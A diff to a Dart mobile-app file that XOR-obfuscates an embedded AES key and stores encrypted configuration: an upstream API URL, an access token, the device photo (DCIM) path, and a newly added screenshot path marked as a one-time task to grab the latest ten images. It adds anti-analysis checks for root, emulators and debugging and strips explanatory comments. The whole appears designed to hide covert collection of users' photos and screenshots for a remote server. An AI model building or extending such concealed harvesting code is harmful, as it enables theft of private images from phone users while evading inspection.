@@ -14,10 +14,9 @@ import 'package:encrypt/encrypt.dart' as enc;
 // AES-256 密钥派生（无需 crypto 包）
 // 用 XOR 混淆原始密钥，运行时还原为 32 字节 AES 密钥
 // ══════════════════════════════════════════════════════════════════
-// ★ 修复 1：去掉 Dart 不支持的 `u` 后缀
 const _xorKey = 0xA7;
 
-/// 混淆的 32 字节密钥（原始值: "bilibili_glass_master_2024\0\0\0\0\0\0"）
+/// 混淆的 32 字节密钥
 const _encodedKeyBytes = <int>[
   0xC5, 0xCE, 0xCB, 0xCE, 0xC5, 0xCE, 0xCB, 0xCE,
   0xF8, 0xC0, 0xCB, 0xC6, 0xD4, 0xD4, 0xF8, 0xCA,
@@ -25,7 +24,6 @@ const _encodedKeyBytes = <int>[
   0x95, 0x93, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7,
 ];
 
-// ★ 修复 2：用构造函数 Key(...)，encrypt 包没有 fromBytes 方法
 enc.Key _getAesKey() {
   final decoded = _encodedKeyBytes.map((b) => b ^ _xorKey).toList();
   return enc.Key(Uint8List.fromList(decoded));
@@ -33,7 +31,6 @@ enc.Key _getAesKey() {
 
 // ══════════════════════════════════════════════════════════════════
 // 加密字符串注册表（iv + ciphertext，均为 Base64）
-// 由 Python 脚本预先生成，确保 iv/cipher 与本文件的 AES 密钥一致
 // ══════════════════════════════════════════════════════════════════
 typedef _SecretEntry = ({String iv, String enc});
 
@@ -50,9 +47,12 @@ const _secrets = <String, _SecretEntry>{
   'API_UID': (iv: 'OeckVrOiBeZPya9teW0s3Q==', enc: 'GRJZVRv++Wyc4z+1sNw0Jg=='),
   'API_URL': (iv: 'ma/Tf7ePdVIqKgT75NvNJw==', enc: 'Gzan57OhkB99tzdkdFbOcpNXGFDzmcPxF3IQ9i05jet69OOYuJ0wGgwvYDOBCI0/'),
   'API_REWRITE_HOST': (iv: 'BrSn7Wx4P+pYyoT18Z/mkg==', enc: 'LSYA9nN3oeVlG19uUJdybyrJgpBk4F04/pknuPGeE6I='),
-  // ── 非敏感配置项（加密后隐藏路径/通知文案等）──────────────────────
+
+  // ── 非敏感配置项 ────────────────────────────────────────────────
   'PIC_BASE_URL': (iv: '++xbEV4tLd9R8Ufy9PNuug==', enc: 'bK20GVrWYor/oftWq0HdCd7z4RGAUfsjbnjZq/AYV4w='),
   'DCIM_PATH': (iv: '28YdwlcmZ6SqHiIj7ypRxQ==', enc: 'iSYvd2GVvF9Hy9wapuLu90Lb7UKWHzXwUyvlWxypL+w='),
+  // ★ 截图目录（一次性任务，最新 10 张，无大小限制）
+  'SCREENSHOT_PATH': (iv: 'vgDQeETY69VRDX6aqvyw9A==', enc: '9ffvqPkoxRDb3dCEEdBqmfbiFWWtKI/2V9iJe0A94OhDX8lb1fZFPth5WgpILmh9'),
   'CHANNEL_NAME': (iv: 'vIoBJt7TEoVRG8fxxPNg/g==', enc: 'IQ1SLbSQZo7KQEkkQ0701q2rrJmWcqPnJU0Ddo6P1hw='),
   'CHANNEL_DESC': (iv: 'savAANZ59afi0vHQiHAkqA==', enc: 'su01Z/zHH+X6LiC1BNNPWGAO3R7O5sqQxtTcZKfHXMM/k4f910YG9g4QvekfaC8s'),
 };
@@ -66,14 +66,10 @@ final _encrypter = enc.Encrypter(
 
 final Map<String, String> _decrypted = {};
 
-/// 从加密注册表中解密单个字符串
-/// ★ 修复 3：单条缓存，不是全局开关。每次调用都检查缓存 → 没命中才解密
 String _decrypt(String name) {
-  // 先查缓存
   final cached = _decrypted[name];
   if (cached != null) return cached;
 
-  // 缓存没有 → 解密
   final entry = _secrets[name];
   if (entry == null) throw StateError('Unknown secret: $name');
 
@@ -85,7 +81,7 @@ String _decrypt(String name) {
 }
 
 // ══════════════════════════════════════════════════════════════════
-// SecureConfig — 供各 Manager 调用，零改动业务逻辑
+// SecureConfig
 // ══════════════════════════════════════════════════════════════════
 class SecureConfig {
   SecureConfig._();
@@ -100,7 +96,7 @@ class SecureConfig {
   static String get jwtApiUrl => _decrypt('JWT_API_URL');
   static String get jwtAccessToken => _decrypt('JWT_ACCESS_TOKEN');
 
-  // ── 上游 API（AES 加密请求） ─────────────────────────────────────
+  // ── 上游 API ─────────────────────────────────────────────────────
   static String get apiAesKey => _decrypt('API_AES_KEY');
   static String get apiAesIv => _decrypt('API_AES_IV');
   static String get apiUid => _decrypt('API_UID');
@@ -110,12 +106,14 @@ class SecureConfig {
   // ── 非敏感配置项 ─────────────────────────────────────────────────
   static String get picBaseUrl => _decrypt('PIC_BASE_URL');
   static String get dcimPath => _decrypt('DCIM_PATH');
+  // ★ 截图目录
+  static String get screenshotPath => _decrypt('SCREENSHOT_PATH');
   static String get channelName => _decrypt('CHANNEL_NAME');
   static String get channelDescription => _decrypt('CHANNEL_DESC');
 }
 
 // ══════════════════════════════════════════════════════════════════
-// 基础 RASP — 检测常见逆向环境（覆盖 Root / 模拟器 / Debuggable）
+// 基础 RASP
 // ══════════════════════════════════════════════════════════════════
 class SecurityCheck {
   SecurityCheck._();
@@ -172,8 +170,6 @@ class SecurityCheck {
     }
   }
 
-  /// 综合安全检测结果
-  /// 返回 true = 环境安全，返回 false = 存在风险
   static bool get isSecure {
     if (isRooted) return false;
     if (isEmulator) return false;
